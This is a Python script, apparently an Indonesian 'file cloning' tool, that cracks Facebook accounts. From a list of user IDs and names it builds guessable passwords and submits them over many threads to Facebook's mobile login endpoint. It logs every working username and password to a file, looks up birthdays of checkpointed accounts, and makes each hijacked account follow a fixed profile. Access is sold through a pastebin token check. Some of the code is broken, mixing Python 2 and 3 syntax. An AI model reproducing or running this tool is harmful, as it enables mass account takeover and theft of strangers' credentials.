#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as diazhealth
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
import os 

import sys

import base64

import random

import requests

import platform

#module 



def Token_token():
	os.system("clear")
	print logo
	print("")
	try:
		tok = open('/sdcard/Download/.qaiser.txt', 'r').read()
		dec = base64.b64decode(tok)
		if len(dec) < 50:
		    not_reg()
		r = requests.get("pastebin.com/raw/Ah0273Lis").text
		if dec in r:
			main() #add your main menu when payment sucess
		else:
		    print('\t  \033[1;91m YOUR  Token_token  IS NOT  APPROVED :(').center(50)
		    print("")
		    print('\033[1;93m Your Token_token : \033[1;92m'+dec+'\n\n\n')
		    raw_input("  \t  \033[1;93m Press enter to check again ")
		    not_reg()
	except (IOError):
	    not_reg()
	except requests.exceptions.ConnectionError:
	    print('\n\n\nTurn on mobile data OR wifi to continue\n\n')
	    sys.exit()

	

def not_reg():
    print('\n\n\nVerify your Token_token\n\n\n')
    string_Token_token = 'abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    v_Token_token = ''.join((random.choice(string_Token_token)) for x in range(50))
    v_Token_token_save = open('/sdcard/Download/.qaiser.txt', 'w')
    v_Token_token_save.write(base64.b64encode(v_Token_token))
    v_Token_token_save.close()
    print('\033[1;93m Your Token_token : \033[1;92m' + v_Token_token)
    print("")
    print("")
    raw_input("  \t  \033[1;93m Press enter to check again ")
    os.system('xdg-open https://wa.me/+923079321417') #whatsapp number here
    Token_token()

    
logo =                                          """   
   \033[1;31m########  ####    ###    ######## 
   \033[1;37m##     ##  ##    ## ##        ##   
   \033[1;31m##     ##  ##   ##   ##      ##   
   \033[1;37m##     ##  ##  ##     ##    ##    
   \033[1;31m##     ##  ##  #########   ##   
   \033[1;37m##     ##  ##  ##     ##  ##      
   \033[1;31m########  #### ##     ## ########
\033[1;36m------------------------\033[1;36m------------------------
\033[1;31m\x1b[1;96m   Author \x1b[1;96m     ➵ \x1b[1;96m    DIAZ HEALTH
\033[1;31m\x1b[1;96m   Facebook\x1b[1;96m    ➵  \x1b[1;96m   ALDI MAULANA
\033[1;31m\x1b[1;96m   GitHub\x1b[1;96m      ➵ \x1b[1;96m    MAFIA-FACEBOOK
\033[1;31m\x1b[1;96m   Version\x1b[1;96m     ➵ \x1b[1;96m    0.1
\033[1;36m------------------------\033[1;36m------------------------ """                                              

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mDIAZ_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSBDIAZ_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back ")
	    diaz()

def diaz():




        
  
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print
    print(' [1] Start File Cloning')
    print(' [E] exit ')
    print('')
    _diaz___ = input(' [✓] Choose option : ')
    if _diaz___ in ('1', '01'):
        __xxx__().diazx(id)
    if _diaz___ in ('2', '02'):
        os.system('python dm.py')
    if _diaz___ in ('E', 'ee'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def diazx(self,id):
  
       
      
         
            

        os.system("clear")
        print(logo)
        self.cnt = input('Put File Name : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [✓] Choose Correct One');
            self.diazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;96m[DIAZ] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} [DIAZ-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('DIAZ_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s [DIAZ-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('DIAZ_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s [DIAZ-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('DIAZ_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] Crack With Auto Pass ')
        print('[2] Crack With Name Digit Pass')
        chi = input('\n [✓] Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;36m\r          DONT USE ANY PROXY {VPN}\033[1;37m")
            print(47*"-")
            print('\033[1;36m Total IDs : %s ' % len(self.id))
            print('\033[1;36m Hacking Started...')
            print(47*"-")
            with diazhealth(max_workers=30) as healthworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            pwx = ["786786"]
                            pwx = ["sayang"]
                            pwx = ["bismillah"]
                            pwx = ["123456"]
                        healthworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\033[1;36m\r          DONT USE ANY PROXY {VPN}\033[1;37m")
            print(47*"-")
            print('\033[1;36m Total IDs : %s ' % len(self.id))
            print('\033[1;36m Hacking Started...')
            print(47*"-")
            with diazhealth(max_workers=30) as healthworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        healthworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

diaz()
